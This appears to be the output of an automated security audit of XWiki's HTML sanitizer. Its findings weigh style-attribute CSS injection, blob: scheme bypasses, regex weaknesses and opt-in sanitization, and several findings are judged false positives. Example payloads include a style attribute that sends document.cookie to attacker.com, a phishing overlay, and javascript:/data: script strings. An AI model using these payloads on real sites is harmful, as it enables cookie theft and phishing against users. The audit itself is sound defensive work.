findings.description: style attribute in uriSafeAttributes bypasses all URL/value validation in SecureHTMLElementSanitizer, allowing CSS injection
findings.reasoning: The `style` attribute is placed in `uriSafeAttributes` (line 132). In `isAllowedValue()`, the first check is `this.uriSafeAttributes.contains(lowercaseAttributeName)` — if true, `result` is immediately set to `true` and no further URL/content validation is performed. This means any value in a `style` attribute passes sanitization unconditionally. Since `style` is also listed as an allowed HTML attribute in `HTMLDefinitions.htmlAttributes` (line 88), an attacker can inject arbitrary CSS into any element. While modern browsers have removed CSS `expression()`, CSS injection still enables: (1) CSS-based data exfiltration via `url()` calls to attacker servers, (2) UI redressing/clickjacking via CSS positioning, (3) In older/non-standard browsers, potential XSS via CSS `expression()` or IE-specific behaviors. The `style` attribute should not bypass URL/content validation entirely — it should either be blocked from uriSafeAttributes or have its own content sanitization.

evidence.code_context:
uriSafeAttributes includes 'style' at line 132. In isAllowedValue (line 197-208):
  result = this.uriSafeAttributes.contains(lowercaseAttributeName);  // returns true for 'style'
  result = result || IS_NO_URI.matcher(valueNoWhitespace).find();
  ...
Since result is already true from uriSafeAttributes check, all subsequent checks are short-circuited by ||. HTMLDefinitions.htmlAttributes also includes 'style' at line 88, confirming style attribute is allowed through the sanitizer. No CSS value validation is performed.
evidence.dataflow_analysis: isAttributeAllowed(elementName, attributeName, attributeValue) -> isAllowedValue() -> uriSafeAttributes.contains('style') = true -> returns true immediately without any content validation
evidence.notes: CSS injection via style attribute could enable UI redressing, data exfiltration via CSS url(), and potentially JS execution in IE/legacy environments. The inclusion of 'style' in uriSafeAttributes appears to be intentional but creates a security gap where no CSS content validation occurs.

exploit_payload.code_snippet:
<!-- Attacker injects HTML with malicious style attribute -->
<div style="background-image: url('https://attacker.com/steal?cookie='+document.cookie)">
<!-- Or for UI redressing -->
<div style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;background:url(https://attacker.com/phishing-page.png)">
<!-- The sanitizer will allow any style value because 'style' is in uriSafeAttributes -->
<!-- isAllowedValue returns true immediately without checking CSS content -->
exploit_payload.scenario: Attacker injects HTML with arbitrary CSS via style attribute that bypasses sanitization due to style being in uriSafeAttributes
exploit_payload.prerequisites: User-controlled HTML input processed by the restricted HTML sanitizer (SanitizerFilter with HTMLCleanerConfiguration.RESTRICTED=true)
exploit_payload.category: CSS injection / UI redressing / data exfiltration

flags.message: CSS injection via style attribute in uriSafeAttributes bypassing validation
flags.evidence: The style attribute is confirmed in uriSafeAttributes list at line 132, and the isAllowedValue() logic uses short-circuit OR evaluation meaning uriSafeAttributes membership bypasses all other content checks

flags.message: Actual exploitability depends on how callers use the sanitizer output and browser behavior
flags.evidence: CSS injection via style is serious but modern browsers have reduced CSS-based exfiltration vectors; however, UI redressing, clickjacking, and data exfiltration via CSS url() remain viable. IE-specific JS execution is largely a historical concern.

sanity_check.reasoning: The code trace is accurate - 'style' is indeed in uriSafeAttributes, and the isAllowedValue() method would short-circuit to return true for style attribute values without any CSS content validation. This is a genuine security concern in a security-focused sanitizer component. The severity depends on whether the library's threat model intends to allow style attributes at all or was meant to restrict CSS injection; placing 'style' in uriSafeAttributes appears to be a design choice that has unintended security consequences by bypassing value validation entirely. This warrants human review to determine if this is intentional design (library responsibility passed to callers) or an actual vulnerability.

findings.description: IS_SCRIPT_OR_DATA regex missing CASE_INSENSITIVE flag verification - pattern does have flag, but misses blob: and filesystem: dangerous URL schemes when allowUnknownProtocols=true
findings.code_snippet: static final Pattern IS_SCRIPT_OR_DATA = Pattern.compile("^(?:\\w+script|data):", Pattern.CASE_INSENSITIVE);
findings.reasoning: When `allowUnknownProtocols=true`, the only protection against dangerous URL schemes is `IS_SCRIPT_OR_DATA` pattern (`^(?:\\w+script|data):`). This pattern blocks `javascript:`, `vbscript:`, `livescript:`, and `data:` but does NOT block `blob:` or `filesystem:` URLs. An attacker who can control a URL attribute value could inject `blob:https://trusted.domain/malicious-uuid` which resolves to attacker-controlled content. The `blob:` scheme is particularly dangerous because it can reference JavaScript-created blobs containing HTML with scripts. When `allowUnknownProtocols=true` (configurable via `xml.htmlElementSanitizer.allowUnknownProtocols`), this creates a bypass for XSS via blob: URLs. The `isScriptOrData()` method is the sole gatekeeper for `allowUnknownProtocols` mode and is insufficient.

evidence.dataflow_analysis: When allowUnknownProtocols=true: isAllowedValue checks !isScriptOrData(attributeValue). IS_SCRIPT_OR_DATA only matches \w+script: and data:. blob:, filesystem:, and other dangerous schemes are NOT matched, so !isScriptOrData('blob:...') = true, and the value is allowed.
evidence.notes: blob: URLs can point to JavaScript-created Blob objects containing HTML with scripts. filesystem: was deprecated but historically dangerous. The pattern is too narrow as a security boundary.

exploit_payload.scenario: When allowUnknownProtocols is configured to true, attacker injects blob: URL that bypasses IS_SCRIPT_OR_DATA check, enabling XSS via blob URL pointing to attacker-controlled HTML
exploit_payload.prerequisites: xml.htmlElementSanitizer.allowUnknownProtocols must be configured to true (non-default), attacker must control href/src attribute value
exploit_payload.category: XSS via dangerous URL scheme bypass

flags.message: The blob: URL scheme bypass is a legitimate security gap but requires allowUnknownProtocols=true which is non-default
flags.evidence: The allowUnknownProtocols configuration key (xml.htmlElementSanitizer.allowUnknownProtocols) must be explicitly enabled. The IS_SCRIPT_OR_DATA regex at line 63 only matches \w+script: and data:, missing blob: and filesystem: schemes.

flags.message: Exploitability is conditional on allowUnknownProtocols=true being configured, reducing real-world impact for most deployments
flags.evidence: Line 206: result = result || (this.allowUnknownProtocols && !isScriptOrData(attributeValue)); - blob: injection only works when allowUnknownProtocols is enabled. Default configuration likely has this disabled.

sanity_check.reasoning: The code accurately shows that IS_SCRIPT_OR_DATA pattern does not cover blob: or filesystem: URL schemes, and when allowUnknownProtocols=true, these schemes would pass through the sanitizer's security check. The vulnerability is real but conditional on a non-default configuration being enabled. This is a legitimate security finding in production library code that handles HTML sanitization, though the actual exploitability in most deployments is reduced by the configuration requirement. A security review is warranted to determine if blob: and filesystem: schemes should be blocked unconditionally or added to the blocklist.

findings.description: DATA_ATTR regex pattern missing quantifier allows any attribute name containing 'data-X' substring to be treated as a safe data attribute, bypassing forbidden attribute checks
findings.reasoning: The `DATA_ATTR` pattern `^data-[\\-\\w.\\u00B7-\\uFFFF]` is missing a `+` (or `*`) quantifier after the character class. It anchors at the start with `^data-` then matches exactly ONE character from the class. Since `find()` is used (not `matches()`), the string `data-abc` still matches because `find()` locates the pattern `data-a` at position 0. However, this is functionally correct for multi-character data attributes. The real security concern is that `isAttributeAllowed(String elementName, String attributeName, String attributeValue)` uses `find()` to check `DATA_ATTR` BEFORE checking `forbidAttributes`. Looking at line 185: `if ((DATA_ATTR.matcher(lowerAttribute).find() || ARIA_ATTR.matcher(lowerAttribute).find()) && !this.forbidAttributes.contains(lowerAttribute))`. The `forbidAttributes` check is applied correctly here. However, the missing `+` quantifier means the character class is `[\\-\\w.\\u00B7-\\uFFFF]` which includes `.` (dot). An attribute like `data-.` (data-dot) would match the pattern. But more importantly, in the context of `find()` vs `matches()`, an attribute name like `zdata-x` would NOT match (anchored with `^`). The actual issue is whether any valid non-data attribute could bypass by containing `data-x` somewhere - but `^` prevents this. So the missing `+` is a code quality issue but not directly exploitable given `find()` + `^` anchor behavior.

evidence.code_context:
Line 68: static final Pattern DATA_ATTR = Pattern.compile("^data-[\\-\\w.\\u00B7-\\uFFFF]");
Line 185: if ((DATA_ATTR.matcher(lowerAttribute).find() || ARIA_ATTR.matcher(lowerAttribute).find())
            && !this.forbidAttributes.contains(lowerAttribute))

With find() semantics: 'data-onclick' -> finds '^data-o' at position 0 -> matches -> treated as data attribute
With find() semantics: 'data-' alone -> no character after dash -> does NOT match (missing character class match)
Note: 'data-onclick' is not a real concern since onclick is not a data-* attribute, but the incomplete quantifier means the full attribute name validation is weakened.
evidence.notes: The correct pattern should be ^data-[\\-\\w.\\u00B7-\\uFFFF]+$ (with + quantifier and $ end anchor) to properly validate data-* attributes per HTML spec. Without end anchor $, attribute 'data-aONLOAD' would match. Without + quantifier, only one char is matched but find() makes this functionally correct for prefixes.

exploit_payload.code_snippet:
<!-- DATA_ATTR regex: ^data-[\-\w.\u00B7-\uFFFF] matches with find()
     Missing + quantifier and $ end anchor means:
     data-xONMOUSEOVER would match 'data-x' at position 0 via find()
     but that's just a data attribute name, not dangerous
     
     More concerning: attribute name 'data-x.onclick' matches (dot in char class)
     The missing end anchor $ means: isAttributeAllowed treats it as data-* attribute
     allowing the attribute through even if it looks unusual -->
<!-- HTML: <div data-x.onclick="alert(1)"> passes as data attribute -->
<!-- This is a code quality issue that could lead to unexpected attribute names being allowed -->
exploit_payload.scenario: Malformed data-* attribute names with special characters pass the DATA_ATTR regex check due to missing + quantifier and end anchor, potentially allowing unexpected attributes through the sanitizer
exploit_payload.prerequisites: Attacker must craft attribute names that look like data-* but contain additional characters after the first valid character

flags.message: Missing quantifier and end anchor in DATA_ATTR regex is a code quality issue, not an exploitable XSS vulnerability
flags.evidence: The pattern '^data-[\-\w.\u00B7-\uFFFF]' with find() semantics still correctly identifies data-* attributes since any string starting with 'data-X' (one char) will match. The absence of '+' and '$' means the pattern validates less strictly than the HTML spec requires, but 'data-onclick' is still a valid data-* attribute name - it doesn't bypass security controls because onclick is not treated as an event handler when prefixed with data-.

flags.message: The claimed bypass scenario is not realistically exploitable for XSS
flags.evidence: The reasoning itself acknowledges 'data-onclick is not a real concern since onclick is not a data-* attribute'. Data attributes (data-*) are safe by HTML spec and never executed as scripts regardless of their full name. The forbidAttributes check adds another layer. Without a concrete exploit path where the missing quantifier leads to script execution, this is not a valid XSS finding.

flags.message: Pattern could be improved to match HTML spec more precisely with '^data-[\-\w.\u00B7-\uFFFF]+$'
flags.evidence: The missing '+' quantifier and '$' end anchor mean the regex is technically less strict than needed per the HTML5 data-* attribute specification, but this doesn't translate to a security vulnerability in the context of HTML sanitization.

sanity_check.reasoning: The DATA_ATTR regex missing a quantifier and end anchor is a code quality issue, not an exploitable XSS vulnerability. The find() semantics make the pattern functionally correct for detecting data-* attribute prefixes, and data-* attributes are inherently safe by HTML specification since browsers never execute them as scripts. The analysis itself admits 'data-onclick is not a real concern' - there is no concrete exploit path where this pattern weakness leads to XSS, making this a false positive.

findings.description: isAllowedDataValue uses non-whitespace-stripped attributeValue for startsWith("data:") check, creating inconsistency with whitespace-stripping applied to other checks in isAllowedValue
findings.reasoning: In `isAllowedValue()`, whitespace stripping is applied to obtain `valueNoWhitespace` for the IS_NO_URI, IS_ALLOWED_URI, and allowUnknownProtocols checks. However, `isAllowedDataValue()` is called with the original `attributeValue` (NOT `valueNoWhitespace`) and uses `attributeValue.startsWith("data:")`. This creates an inconsistency: if an attacker provides a URL like `\u0000data:text/html,<script>alert(1)</script>` for an `img src` attribute, the ATTR_WHITESPACE stripping would turn it into `data:text/html,...` for other checks. IS_SCRIPT_OR_DATA would match `data:` (blocking it in the allowUnknownProtocols path). But `isAllowedDataValue` checks the ORIGINAL value - `\u0000data:...` does NOT start with `data:`, so `isAllowedDataValue` returns false. This means this specific bypass path is NOT exploitable in the default case. HOWEVER, the reverse is true: a legitimate `data:image/png;base64,...` value for `img src` passes correctly. The inconsistency itself is a latent issue - if someone refactors to pass `valueNoWhitespace` to `isAllowedDataValue`, then `\u0000data:text/html` would be allowed for media tags, potentially enabling stored XSS. The current code is inconsistent but safe in practice.

evidence.code_context:
isAllowedValue (lines 197-208):
  String valueNoWhitespace = ATTR_WHITESPACE.matcher(attributeValue).replaceAll("");
  result = this.uriSafeAttributes.contains(lowercaseAttributeName);
  result = result || IS_NO_URI.matcher(valueNoWhitespace).find();  // uses stripped
  result = result || this.allowedUriPattern.matcher(valueNoWhitespace).find();  // uses stripped
  result = result || isAllowedDataValue(lowercaseElementName, lowercaseAttributeName, attributeValue);  // ORIGINAL
  result = result || (this.allowUnknownProtocols && !isScriptOrData(attributeValue));  // ORIGINAL

isAllowedDataValue uses attributeValue.startsWith("data:") on original, not valueNoWhitespace.
ATTR_WHITESPACE includes \u0000-\u0020 range (NULL through SPACE).
evidence.notes: The inconsistency means: '\u0000data:image/png' would fail startsWith check (good, blocks it). But 'data:image/png' works correctly. The isScriptOrData check at line 221 also uses the original value but strips whitespace internally. So the security model is: strip whitespace for IS_NO_URI/IS_ALLOWED_URI, but don't strip for isAllowedDataValue and isScriptOrData (both strip internally or check prefix).

exploit_payload.scenario: Latent vulnerability where inconsistent whitespace-stripping in isAllowedDataValue could allow data:text/html XSS in media tags if the code is refactored to use valueNoWhitespace
exploit_payload.prerequisites: Code refactoring that passes valueNoWhitespace to isAllowedDataValue, or direct exploitation requires bypassing current startsWith check
exploit_payload.category: Potential XSS via data: URI in media element attributes

flags.message: The inconsistency in whitespace stripping between isAllowedDataValue and other checks is a code quality issue but not a security vulnerability
flags.evidence: If an attacker prepends null bytes or whitespace before 'data:', the startsWith('data:') check would FAIL, meaning the value would NOT be allowed as a data URI. This is actually the secure behavior - the inconsistency causes over-rejection of malformed data URIs, not under-rejection. A value like '\u0000data:image/png' would NOT pass startsWith('data:'), so it would be blocked.

flags.message: The claimed attack vector does not work - whitespace-prefixed data URIs would be blocked, not allowed
flags.evidence: The finding claims '\u0000data:...' could bypass the check. But startsWith('data:') on '\u0000data:...' returns FALSE (not true), meaning isAllowedDataValue returns false, which would deny the attribute. This is not a bypass - it's stricter than intended. The real security question is whether '\u0000data:...' could pass OTHER checks (IS_NO_URI, IS_ALLOWED_URI), but those use valueNoWhitespace (stripped), so '\u0000data:...' becomes 'data:...' and would be matched against allowed URI patterns, not granted via isAllowedDataValue.

sanity_check.reasoning: The finding describes an inconsistency where isAllowedDataValue uses the original attributeValue with startsWith('data:') instead of the whitespace-stripped valueNoWhitespace. However, this inconsistency creates a more restrictive behavior (not less secure): values with leading whitespace/null bytes would FAIL the startsWith check and not be allowed as data URIs. The actual security concern would be if such values could pass through OTHER checks (IS_NO_URI or IS_ALLOWED_URI patterns using valueNoWhitespace), which is a different and separate question. The described attack vector - using whitespace-prefixed data URIs to bypass the data URI check - does not work because the bypass would cause rejection by isAllowedDataValue, not acceptance.

findings.description: LinkFilter.isExternalLink uses URI.isAbsolute() which returns true for javascript: URIs, meaning javascript: hrefs are classified as "external links" but the filter only adds noopener/noreferrer without blocking the dangerous scheme
findings.reasoning: The `isExternalLink` method uses `new URI(href).isAbsolute()` to determine if a link is external. `URI.isAbsolute()` returns true if the URI has a scheme component. Since `javascript:alert(1)` is a valid URI with scheme `javascript`, `isAbsolute()` returns true. This means `javascript:` links are classified as "external links." The `filter(Element link)` method then only adds `noopener`/`noreferrer` to the `rel` attribute for links with unsafe targets — it does NOT block `javascript:` hrefs. The filter's purpose is phishing prevention (preventing window opener hijacking), not XSS prevention. However, since `javascript:` URIs are technically absolute URIs, this classification could mask that the link is dangerous. The real protection against `javascript:` in hrefs relies entirely on `SecureHTMLElementSanitizer`. If `SanitizerFilter` is not applied (e.g., `RESTRICTED=false`), `LinkFilter` alone provides no protection against `javascript:` XSS in href attributes.

evidence.notes: Java URI.isAbsolute() JavaDoc: 'A URI is absolute if, and only if, it has a scheme component.' javascript:alert(1) has scheme='javascript', so isAbsolute()=true. The filter correctly identifies it as external but takes no action to block it.

exploit_payload.scenario: When HTML is processed only by LinkFilter without SanitizerFilter in restricted mode, javascript: href attributes are kept intact since LinkFilter only adds noopener/noreferrer and does not block dangerous URI schemes
exploit_payload.prerequisites: HTML processing pipeline uses LinkFilter without also applying SanitizerFilter in restricted mode (RESTRICTED=true)
exploit_payload.category: XSS via javascript: URI in anchor href

flags.message: The finding mischaracterizes the security model - LinkFilter is not responsible for blocking javascript: URIs
flags.evidence: The evidence itself notes: 'Protection against javascript: hrefs depends entirely on SecureHTMLElementSanitizer.' This is an intentional defense-in-depth architecture where XSS sanitization is handled at a different layer, not by LinkFilter which only manages noopener/noreferrer rel attributes.

flags.message: LinkFilter's purpose is to add noopener/noreferrer to external links, not to sanitize dangerous schemes
flags.evidence: The filter's documented purpose is to handle rel attributes for external links (target safety). Blocking javascript: URIs is a separate concern handled by HTML sanitization layers (SecureHTMLElementSanitizer). Expecting LinkFilter to block javascript: conflates two different security responsibilities.

flags.message: While not strictly wrong, isExternalLink returning true for javascript: could be tightened to exclude dangerous schemes
flags.evidence: A more defensive implementation could explicitly exclude non-http/https schemes, but this is a defense-in-depth improvement rather than a vulnerability fix since javascript: URI blocking is handled elsewhere in the pipeline.

sanity_check.reasoning: The finding identifies a real technical fact (URI.isAbsolute() returns true for javascript: URIs) but incorrectly concludes this is a vulnerability in LinkFilter. The finding's own evidence states that protection against javascript: hrefs is handled by SecureHTMLElementSanitizer - this is an intentional layered security architecture. LinkFilter is not designed to block dangerous schemes; it manages noopener/noreferrer rel attributes for external links. The vulnerability claim that javascript: hrefs are not blocked is misleading because this is handled by a different component in the security pipeline. This is a false positive based on misunderstanding the component's responsibility within the security architecture.

findings.description: allowUnknownProtocols defaults to TRUE, meaning any non-script/data URL scheme (including blob:, filesystem:, tel:, etc.) is allowed by default — the IS_SCRIPT_OR_DATA check is the only guard and it misses dangerous schemes like blob:
findings.reasoning:
The `isAllowUnknownProtocols()` method returns `Boolean.TRUE` as the default value (line 133). This means that when no configuration is set, `allowUnknownProtocols` is `true` by default in `SecureHTMLElementSanitizer.initialize()`. In `isAllowedValue()`, the branch `result = result || (this.allowUnknownProtocols && !isScriptOrData(attributeValue))` is effectively always active. The `isScriptOrData()` check only blocks patterns matching `^(?:\\w+script|data):` (with CASE_INSENSITIVE). This means:
1. `blob:` URLs pass — not matched by IS_SCRIPT_OR_DATA
2. `filesystem:` URLs pass
3. `tel:` URLs pass (though tel: is also in IS_ALLOWED_URI)
4. Any custom/unknown scheme passes

The most dangerous case is `blob:` — in a browser context, a blob URL created by JavaScript can point to HTML content with embedded scripts. If an attacker can inject `<a href="blob:https://victim.com/uuid">` where the blob UUID points to attacker-controlled HTML with `<script>`, clicking the link opens the blob document which executes in the origin context. Combined with the default `allowUnknownProtocols=true`, this is a real XSS vector in the default configuration.

evidence.dataflow_analysis: Default config -> allowUnknownProtocols=true -> isAllowedValue allows any URL not matching IS_SCRIPT_OR_DATA -> blob:, filesystem:, and other dangerous schemes pass through in default configuration
evidence.notes: This is the default behavior without any configuration change. The IS_ALLOWED_URI allowlist check at line 204 runs first but uses || so if IS_NO_URI or other conditions fail, the allowUnknownProtocols fallback at line 206 still allows blob: through.

exploit_payload.scenario: By default (allowUnknownProtocols=true), attacker injects blob: URL into an anchor href that passes SecureHTMLElementSanitizer, enabling XSS when victim clicks the link
exploit_payload.prerequisites: Attacker needs write access to XWiki content to inject the blob URL; victim must click the crafted link; blob URL must be pre-created in the victim's browser context (requires prior JS execution) - OR - attacker uses a blob URL from another same-origin resource
exploit_payload.category: XSS via blob: URL scheme bypass in default configuration

flags.message: The severity depends on how this sanitizer is used in practice and whether downstream callers can override the default configuration
flags.evidence: The finding correctly identifies that isAllowUnknownProtocols() returns Boolean.TRUE as the default. The dataflow to isAllowedValue() allowing blob: URLs is correctly traced. However, in a library context, this is a security-relevant design choice that downstream consumers may or may not override. The question is whether XWiki's own usage passes user-controlled content through this sanitizer with the default configuration.

flags.message: This appears to be a genuine security configuration default issue in XWiki's HTML sanitizer that could lead to XSS via blob: URLs or other dangerous schemes
flags.evidence: The isScriptOrData regex '^(?:\\w+script|data):' with CASE_INSENSITIVE correctly blocks javascript:, vbscript:, and data: URIs but does not block blob:, filesystem:, tel:, or other potentially dangerous schemes. With allowUnknownProtocols=true by default, these schemes pass through the sanitizer unblocked.

sanity_check.reasoning: The code analysis is accurate: isAllowUnknownProtocols() does return Boolean.TRUE as default, and the dataflow through SecureHTMLElementSanitizer correctly shows that blob: and other non-script/data URLs would be allowed by default. This is a genuine security concern in an HTML sanitizer context (XSS via blob: URLs is a known attack vector). However, the severity depends on XWiki's actual usage patterns and whether this default is intentional design. As a security library in a web/template-engine context, having allowUnknownProtocols=true as a default in an HTML sanitizer is a legitimate security finding that warrants review and possible remediation to a safer default of false.

findings.description: SanitizerFilter only applies sanitization when RESTRICTED=true cleaning parameter is set, meaning HTML sanitization is opt-in rather than the secure default
findings.reasoning: The `SanitizerFilter.filter()` method only invokes `cleanDocument()` when the cleaning parameter `HTMLCleanerConfiguration.RESTRICTED` is explicitly set to `"true"`. This means that HTML sanitization via `SecureHTMLElementSanitizer` is entirely opt-in. In the default (non-restricted) mode, no element or attribute filtering occurs, and dangerous elements/attributes like `<script>`, `<iframe>`, `onerror`, `onclick`, `javascript:` hrefs etc. all pass through unfiltered. Any code path that processes user-controlled HTML without explicitly setting `RESTRICTED=true` will receive no XSS protection from the sanitizer chain. This is a defense-in-depth issue - the secure default should be to sanitize HTML, with an explicit opt-out for trusted content, not the reverse.

evidence.notes: The design is intentional - restricted mode is for untrusted user content. However, the opt-in nature means any integration that forgets to set RESTRICTED=true gets no XSS protection. The string literal 'true' at line 79 is what the CodeQL query flagged.

exploit_payload.scenario: Integration code that fails to set RESTRICTED=true cleaning parameter gets no XSS protection since SanitizerFilter only sanitizes in restricted mode
exploit_payload.prerequisites: Integration code must fail to set HTMLCleanerConfiguration.RESTRICTED=true when processing user-controlled HTML

flags.message: Opt-in sanitization may be an intentional design decision rather than a vulnerability
flags.evidence: The evidence notes explicitly state: 'The design is intentional - restricted mode is for untrusted user content.' This is a library where callers choose security level. The RESTRICTED parameter exists precisely to enable sanitization when needed.

flags.message: The opt-in nature of sanitization is a security design concern but may not be a direct vulnerability in the library itself
flags.evidence: In a library/framework context, it is common to have security features that callers must explicitly enable. The real risk is in callers not enabling RESTRICTED=true, which is a caller responsibility issue. The library itself correctly implements the sanitization when requested.

flags.message: The finding represents a legitimate security concern about insecure defaults in the XWiki HTML sanitization framework
flags.evidence: If upstream XWiki components that process user-provided HTML fail to set RESTRICTED=true, XSS vulnerabilities could result. However, this is a design/integration issue rather than a direct code vulnerability in SanitizerFilter itself.

sanity_check.reasoning: The code accurately reflects what is described - sanitization only occurs when RESTRICTED=true is set. While this is factually correct, whether it constitutes a vulnerability depends on context: this is a library where the design intent appears to be opt-in sanitization for restricted/untrusted content. The real risk is that callers (including XWiki's own components) might process untrusted HTML without enabling the RESTRICTED parameter, leading to XSS. This warrants manual review to assess whether: (1) default XWiki usage paths set RESTRICTED=true when processing user content, and (2) whether this constitutes a systemic insecure default across the XWiki ecosystem.

findings.description: getAllowedUriRegexp() allows admin-configurable URI allowlist pattern that could override the secure default IS_ALLOWED_URI pattern, potentially allowing dangerous URI schemes if misconfigured
findings.reasoning: The `initialize()` method allows an administrator-configured regex pattern to completely replace the default `IS_ALLOWED_URI` pattern (`^(?:(?:f|ht)tps?|mailto|tel|callto|cid|xmpp):`). If a misconfigured or malicious regex is set via `xml.htmlElementSanitizer.allowedUriRegexp`, it can allow dangerous URI schemes to pass through URL validation. For example, a broad pattern like `.*` or `^javascript:alert` (to test) would allow `javascript:` URIs. More subtly, an overly broad pattern like `^[a-z]+:` would match all URI schemes including `javascript:` and `vbscript:`. Note that `IS_SCRIPT_OR_DATA` is NOT applied against this `allowedUriPattern` match path — it only applies in the `allowUnknownProtocols` branch. So if `allowedUriPattern.matcher(valueNoWhitespace).find()` returns true for a `javascript:` URL, it would be allowed even when `allowUnknownProtocols=false`! This is a significant security risk if admin configuration can be influenced by attackers.

evidence.notes: Configuration source is 'restricted' (line 65 of HTMLElementSanitizerConfiguration.java uses @Named('restricted') provider), which may limit who can set this. However if admin misconfigures or if the config source is compromised, this creates a direct XSS bypass.

exploit_payload.scenario: Admin misconfiguration of allowedUriRegexp completely replaces the secure URI allowlist, potentially allowing javascript: or other dangerous schemes through URL validation without IS_SCRIPT_OR_DATA protection
exploit_payload.prerequisites: Attacker needs admin-level access to XWiki configuration to set xml.htmlElementSanitizer.allowedUriRegexp, or admin misconfigures the pattern
exploit_payload.category: XSS via admin-configurable URI regex bypass

flags.message: Exploitability depends on who can set the configuration and whether it requires admin privileges
flags.evidence: The evidence notes that the configuration source uses @Named('restricted') provider, limiting who can set this value. If only administrators can configure this, the threat model is reduced to admin misconfiguration rather than external attacker exploitation.

flags.message: IS_SCRIPT_OR_DATA check is bypassed when allowedUriPattern matches, creating a direct XSS path
flags.evidence: Code at isAllowedValue() line 204 shows: 'result = result || this.allowedUriPattern.matcher(valueNoWhitespace).find()' - the IS_SCRIPT_OR_DATA check is only in the allowUnknownProtocols branch, not when allowedUriPattern matches. A misconfigured broad regex could allow javascript: URIs.

flags.message: This is a configuration-driven security bypass in an HTML sanitizer library
flags.evidence: The SecureHTMLElementSanitizer is part of XWiki's XML/HTML processing security layer. The finding is code-accurate - the pattern replacement does occur with no validation against dangerous schemes. No CVE match provided.

sanity_check.reasoning: The code accurately shows that an admin-configurable regex can completely replace the default URI allowlist pattern without any validation against dangerous schemes like 'javascript:'. The real question is whether this constitutes a security vulnerability or an intentional design decision for administrator flexibility. The IS_SCRIPT_OR_DATA check bypass when allowedUriPattern matches is a legitimate concern. However, since this requires administrator-level configuration access (restricted provider), exploitability by external attackers is limited, making this more of a defense-in-depth concern that deserves manual review by a security expert familiar with XWiki's threat model.

findings.description: HTMLElementSanitizerConfiguration.allowUnknownProtocols defaults to TRUE, allowing non-standard URI protocols through the sanitizer
findings.reasoning:
The `isAllowUnknownProtocols()` method returns `Boolean.TRUE` as the default value when no configuration is present. This is consumed in `SecureHTMLElementSanitizer.isAllowedValue()` at line 206:

```java
result = result || (this.allowUnknownProtocols && !isScriptOrData(attributeValue));
```

When `allowUnknownProtocols=true`, any URI protocol is allowed in attributes (href, src, xlink:href, etc.) as long as it doesn't match the `IS_SCRIPT_OR_DATA` regex `^(?:\\w+script|data):`. This pattern blocks `javascript:`, `vbscript:`, and `data:` URIs, but does NOT block:
- `blob:` URIs (can be used to load attacker-controlled JavaScript content)
- `filesystem:` URIs
- Other custom/proprietary protocol handlers that could execute code

Since `allowUnknownProtocols=true` is the DEFAULT (not requiring any configuration), most deployments without explicit configuration will have this insecure default enabled. An attacker who can inject HTML content (e.g., through wiki markup) can use `blob:` URLs or other non-standard protocols in href/src attributes that bypass the sanitizer's protocol check.

evidence.dataflow_analysis: Config default TRUE -> allowUnknownProtocols=true -> isAllowedValue() passes blob: URIs -> attacker-controlled href/src/xlink:href attributes with blob: pass sanitization
evidence.notes: The IS_SCRIPT_OR_DATA regex blocks javascript:, vbscript:, and data: but allows blob: and other protocols. Since the default is TRUE, this affects all default installations.

exploit_payload.scenario: Attacker injects content with blob: or other non-standard protocol URIs in href/src attributes that bypass the sanitizer's protocol allowlist because allowUnknownProtocols defaults to TRUE
exploit_payload.prerequisites: Attacker must be able to inject HTML content into the wiki (e.g., as a wiki editor or through another injection vector). The target application must be using the default configuration without explicitly setting allowUnknownProtocols=false.
exploit_payload.category: XSS via unsanitized URI protocol bypass

flags.message: The exploitability depends on how blob: and other non-script protocols can be weaponized in context
flags.evidence: blob: URIs can be used to load attacker-controlled content if a blob URL can be injected, but this requires prior script execution to create the blob URL. filesystem: is limited to Chrome extensions. The practical XSS risk from these protocols is lower than javascript: or data: URIs.

flags.message: The default of allowUnknownProtocols=TRUE is a security-relevant configuration choice that affects all default installations
flags.evidence: The IS_SCRIPT_OR_DATA regex ^(?:\w+script|data): blocks known dangerous protocols but the default TRUE for allowUnknownProtocols could permit lesser-known protocols like blob:, filesystem:, feed:, or custom protocol handlers in href/src attributes.

sanity_check.reasoning: The finding is accurate: the code does default to Boolean.TRUE for allowUnknownProtocols, and the IS_SCRIPT_OR_DATA pattern does not cover all potentially dangerous protocols like blob: or custom schemes. This is a legitimate security concern in an HTML sanitizer that is part of a security-sensitive library layer (xml-processing, security). However, the real-world XSS exploitability via blob: URIs specifically is limited since blob: URLs require prior script execution to create, reducing the effective severity. The finding deserves human review to assess whether the default should be FALSE for a security-first library.

findings.description: SecureHTMLElementSanitizer IS_SCRIPT_OR_DATA regex does not block blob: URIs when allowUnknownProtocols is true
findings.reasoning: The `IS_SCRIPT_OR_DATA` pattern `^(?:\\w+script|data):` is the only protection when `allowUnknownProtocols=true` (which is the default). This pattern blocks: - `javascript:` (matches `\w+script:`) - `vbscript:` (matches `\w+script:`) - `data:` (matches `data:`) But it does NOT block: - `blob:` URIs - an attacker can create a Blob containing JavaScript and reference it via `blob:` in href/src - `filesystem:` URIs - Any other non-standard protocol handlers When `allowUnknownProtocols=true` (default), the sanitizer falls through to this check as the last line of defense in `isAllowedValue()`. Since `blob:` doesn't match `IS_SCRIPT_OR_DATA`, a `blob:` URI in an `href` attribute passes the sanitizer completely. An attacker with HTML injection can create: ```html Click to win! ``` Or more dangerously in a context where blob URLs can be loaded as resources.

evidence.notes: The combined effect: IS_NO_URI doesn't match blob:, IS_ALLOWED_URI doesn't match blob:, but allowUnknownProtocols=true bypasses both since isScriptOrData(blob:...) is false.

exploit_payload.scenario: Attacker injects blob: URI in href attribute that bypasses IS_SCRIPT_OR_DATA check and passes through the HTML sanitizer due to allowUnknownProtocols defaulting to true
exploit_payload.prerequisites: Attacker must have HTML injection capability in the wiki. The blob: URL itself would typically need to be created client-side, so the direct XSS impact depends on how the browser handles blob: links.
exploit_payload.category: Sanitizer bypass via non-standard URI protocol

findings.description: SVGDefinitions field safeTags - structural finding, not a vulnerability
findings.reasoning: The `safeTags` field in SVGDefinitions is part of a DOMPurify-inspired allowlist system. The field itself is just a Set<String> declaration. The actual tags contained (svg, a, altglyph, circle, clippath, defs, desc, ellipse, etc.) are standard SVG tags that are safe when properly sanitized. The sanitizer also checks attributes separately. This is a false positive - the CodeQL query appears to be enumerating SVGDefinitions fields without identifying a specific vulnerability. The `style` tag in safeTags could be a concern but the sanitizer handles its content properly through other mechanisms.

evidence.code_context:
SVGDefinitions.java line 48:
private final Set<String> safeTags;

